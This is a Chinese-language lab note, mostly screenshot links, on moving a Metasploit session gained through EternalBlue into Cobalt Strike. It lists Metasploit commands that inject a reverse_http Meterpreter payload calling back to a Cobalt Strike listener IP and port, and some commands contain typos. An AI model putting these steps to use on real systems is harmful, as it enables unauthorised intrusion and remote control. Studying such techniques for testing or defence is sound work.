#### **msf调用永恒之蓝攻击模块将会话转移到cs中**

---



![image-20210827111457310](会话转移\image-20210827111457310.png)

![image-20210827111547972](会话转移\image-20210827111547972.png)

![image-20210827111721827](会话转移\image-20210827111721827.png)

![image-20210827111846007](会话转移\image-20210827111846007.png)

![image-20210827112426841](会话转移\image-20210827112426841.png)

![image-20210827112449014](会话转移\image-20210827112449014.png)

![image-20210827112809967](会话转移\image-20210827112809967.png)

![image-20210827112935235](会话转移\image-20210827112935235.png)

![image-20210827113338132](会话转移\image-20210827113338132.png)

![image-20210827113359985](会话转移\image-20210827113359985.png)

![image-20210827113620880](会话转移\image-20210827113620880.png)

![image-20210827113857288](会话转移\image-20210827113857288.png)





### **Cobalt Strike**

cs可以在Ubuntu，centos，Windows2008,2012,2019，win7，win10，win11，都可以运行

只要可以执行 java -version 成功

centos安装  yum instal openjdk@13 unzip

cs4.2 最好使用jdk11以上

![](会话转移\image-20210827140254423.png)

![image-20210827140409050](会话转移\image-20210827140409050.png)

![image-20210827160438311](会话转移\image-20210827160438311.png)

**1，bg 会话**

**2.调用payload_inject 模块**

use exploit/windows/local/payload_inject

**3.在该模块上配置与cobalt strike上为同样类型的payload**

set payload windows/meterpreter/reverse_http**（cs程序只支持http和https协议）**

**4.设置 DisablePayloadHandler 为 True，此选项会让 Metasploit Framework 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉 Metasploit Framework 说我们已经建立了监听器，不必再新建监听器了。**

set disablepayloadhandler true

**5.设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 与端口**

set lhosts 192.168.21.43

set lport 8080

![image-20210827160524003](会话转移\image-20210827160524003.png)

**6，运行run**

![image-20210827162931510](会话转移\image-20210827162931510.png)

![image-20210827163040114](会话转移\image-20210827163040114.png)

![image-20210827163212188](会话转移\image-20210827163212188.png)

![image-20210827173045062](会话转移\image-20210827173045062.png)

![image-20210827174242671](会话转移\image-20210827174242671.png)

